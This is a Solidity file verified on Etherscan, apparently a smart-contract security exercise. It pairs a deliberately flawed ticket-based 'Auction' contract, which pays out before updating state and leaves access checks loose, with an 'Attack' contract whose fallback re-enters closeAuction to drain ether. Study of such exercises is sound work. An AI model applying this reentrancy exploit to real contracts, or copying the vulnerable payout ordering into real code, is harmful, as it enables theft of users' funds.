/**
 *Submitted for verification at Etherscan.io on 2022-03-13
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.12;
pragma abicoder v2;

contract Attack {
    Auction public auction;

    constructor(address _autionAddress) {
        auction = Auction(_autionAddress);
    }

    fallback() external payable {
        if (address(auction).balance >= 3 gwei) {
            auction.closeAuction();
        }
    }

    function attack(uint256 nbTicket) external payable {
        require(msg.value >= nbTicket * (3 gwei));
        auction.buy{value: nbTicket * (3 gwei)}(nbTicket);
        auction.newBid(nbTicket);
        auction.closeAuction();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Auction {
    //URL of the artwork
    string public constant URL = "http://...";
    address public artwork;

    //Account address of the author
    address public author = msg.sender;

    address public owner = msg.sender;

    //Current state of the auction
    bool public auctionState = false;

    //Amount of all sold tickets
    uint256 public soldTickets = 0;
    uint256 public maxBid = 0;
    address public maxBidder;
    uint256 public minPrice = 10;

    address[] public bidders;

    mapping(address => uint256) public ticketBalance;

    mapping(address => uint256) bids;

    mapping(address => bool) increaseMinPrice;

    /*
    Function that returns the current balance of the contract
    */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /*
    Users can buy auction tickets. 
    One ticket costs 3 Gwei
    */
    function buy(uint256 nbTickets) external payable {
        require(msg.value == nbTickets * (3 gwei));
        ticketBalance[msg.sender] += nbTickets;
        soldTickets += nbTickets;
    }

    /*
    Users can sell theit tickets and get their ether back.
    */
    function sell(uint256 nbTickets) external {
        require(nbTickets <= ticketBalance[msg.sender]);
        ticketBalance[msg.sender] -= nbTickets;
        payable(msg.sender).transfer(nbTickets * (3 gwei));
    }

    /*
    Function that returns the address of the current owner.
    */
    function getOwner() external view returns (address) {
        return owner;
    }

    /*
    Owner can give the contract as a gift to another account
    */
    function giveForFree(address a) external {
        require(msg.sender == owner && a != address(0));
        owner = a;
    }

    /*
    Users can make a bid with auction tickets
    */
    function newBid(uint256 nbTickets) external {
        if (!auctionState) {
            auctionState = true;
            maxBid = nbTickets;
            maxBidder = msg.sender;
        } else {
            //recover its previous bid:
            ticketBalance[msg.sender] += bids[msg.sender];
            require(nbTickets <= ticketBalance[msg.sender]);
            if (nbTickets > maxBid) {
                maxBid = nbTickets;
                maxBidder = msg.sender;
            }
        }
        if (!member(msg.sender, bidders)) {
            bidders.push(msg.sender);
        }
        //take the new bid into account:
        bids[msg.sender] = nbTickets;
        ticketBalance[msg.sender] -= nbTickets;
    }

    /*
    Return the current maximal bid
    */
    function getMaximalBid() external view returns (uint256) {
        require(auctionState);
        return maxBid;
    }

    /*
    Return the current maximal bidder
    */
    function getMaximalBidder() external view returns (address) {
        require(auctionState);
        return maxBidder;
    }

    /*
    Return the current minimal price
    */
    function getMinimalPrice() external view returns (uint256) {
        return minPrice;
    }

    /*
    Owner can increase the minimal price by 10 tickets only once.
    */
    function increaseMinimalPrice() external {
        require(!increaseMinPrice[msg.sender]);
        minPrice += 10;
        increaseMinPrice[msg.sender] = true;
    }

    /*
    Any user can stop the current auction
    */
    function closeAuction() external {
        require(auctionState);
        address recipient;

        if (maxBid >= minPrice) {
            recipient = owner;
            owner = payable(maxBidder);
            payable(recipient).transfer(maxBid * (3 gwei));
            minPrice = maxBid;
            auctionState = false;

            //all bids are cleared:
            uint256 length = bidders.length;
            for (uint256 i = 0; i < length; i++) {
                bids[bidders[i]] = 0;
            }
        }
    }

    function check() external view returns (bool, bool) {
        return (
            (soldTickets * (3 gwei) <= this.getBalance()),
            (soldTickets * (3 gwei) >= this.getBalance())
        );
    }

    /*
    Check if an address s is in a tab 
    */
    function member(address s, address[] memory tab)
        private
        pure
        returns (bool)
    {
        uint256 length = tab.length;
        for (uint256 i = 0; i < length; i++) {
            if (tab[i] == s) return true;
        }
        return false;
    }
}